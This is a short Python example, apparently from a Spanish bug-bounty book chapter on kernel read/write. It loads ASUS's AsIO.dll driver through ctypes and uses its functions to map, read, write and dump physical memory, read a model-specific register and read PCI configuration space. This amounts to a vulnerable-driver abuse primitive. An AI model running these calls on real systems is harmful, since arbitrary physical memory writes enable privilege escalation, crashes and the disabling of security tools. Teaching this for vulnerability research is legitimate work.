# Extraído de: LibroBugBounty/cap-11-kernel-rw.md
import ctypes

# Cargar AsIO.dll (normalmente en el directorio de ASUS)
asio = ctypes.CDLL("AsIO.dll")

# Ejemplo: mapear 4 KB de memoria física en dirección 0x1000
phys_addr = 0x1000
size = 0x1000
virt_addr = asio.ASIO_MapMem(phys_addr, size)
print(f"Mapped 0x{phys_addr:X} -> 0x{virt_addr:X}")

# Ejemplo: leer un byte de memoria física
value = asio.Read_Mem_Byte(virt_addr)
print(f"Value at phys 0x{phys_addr:X}: 0x{value:02X}")

# Ejemplo: escribir un DWORD en memoria física
asio.Write_Mem_Dword(virt_addr + 0x10, 0xDEADBEEF)

# Ejemplo: leer un MSR (Model Specific Register)
msr_value = asio.ASIO_ReadMSR(0x1A0)  # MSR_IA32_MISC_ENABLE
print(f"MSR 0x1A0: 0x{msr_value:016X}")

# Ejemplo: leer PCI configuration space
pci_value = asio.Read_PCI_Dword(0, 0, 0, 0)  # Bus 0, Dev 0, Func 0, Reg 0
print(f"PCI 00:00.0 Vendor ID: 0x{pci_value & 0xFFFF:04X}")

# Ejemplo: volcar un rango de memoria física
buffer = ctypes.create_string_buffer(0x1000)
asio.Dump_PhysMem(phys_addr, buffer, 0x1000)
